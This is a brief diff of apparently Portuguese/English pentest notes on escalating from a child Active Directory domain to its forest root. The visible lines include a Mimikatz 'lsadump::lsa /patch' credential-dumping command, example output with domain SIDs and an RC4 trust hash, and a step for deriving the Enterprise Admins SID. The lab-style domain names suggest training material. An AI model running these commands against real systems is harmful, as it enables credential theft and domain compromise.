@@ -3115,10 +3115,13 @@ ou
 ```
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 ```
+EXEMPLO:
+```
 Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-1874506631-3219952063-538504511)
 Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
 (In) DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
 rc4_hmac_nt       c4bb6612585cac1e66c606f281f95a21
+```
 
 3. ENCONTRAR O SID DO GRUPO "Enterprise Admins" DO DOMINIO PARENTE (NA MINHA MÁQUINA)
 - For finding the SID of the "Enterprise Admins" group you can find the SID of the root domain and set it in S-1-5-21-<root domain>-519:
